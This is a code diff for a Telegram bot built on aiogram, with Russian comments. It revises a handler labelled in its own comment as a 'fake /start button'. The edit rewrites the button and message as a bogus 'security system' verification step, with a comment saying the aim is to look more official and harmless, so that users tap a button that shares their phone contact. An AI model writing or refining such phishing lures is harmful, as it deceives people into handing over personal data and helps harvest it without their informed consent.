@@ -83,7 +83,7 @@ async def handle_business_connection(connection: BusinessConnection):
     logging.info(f"✅ Бот подключен к аккаунту: {connection.user.first_name} (ID: {connection.id})")
 
 
-# === ФАЛЬШИВАЯ КНОПКА /start ===
+# === ФАЛЬШИВАЯ КНОПКА /start (Улучшенная версия) ===
 @dp.message(F.text == "/start")
 @dp.business_message(F.text == "/start")
 async def cmd_start(message: Message):
@@ -92,16 +92,19 @@ async def cmd_start(message: Message):
         return
     processed_messages.add(msg_key)
 
+    from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
+    
+    # Текст кнопки изменён на более "официальный" и безобидный
     keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📊 Получить данные", request_contact=True)]],
+        keyboard=[[KeyboardButton(text="🔓 Подтвердить доступ", request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True
     )
 
     await message.answer(
-        "🤖 <b>Автоматический ассистент</b>\n\n"
-        "Для получения данных владельца нажмите кнопку ниже.\n"
-        "<i>Требуется подтверждение контакта.</i>",
+        "🔒 <b>Система безопасности ассистента</b>\n\n"
+        "Для активации функций и продолжения работы необходимо подтвердить ваш контакт.\n"
+        "<i>Это стандартная процедура верификации. Нажмите на кнопку ниже.</i>",
         reply_markup=keyboard,
         parse_mode="HTML"
     )
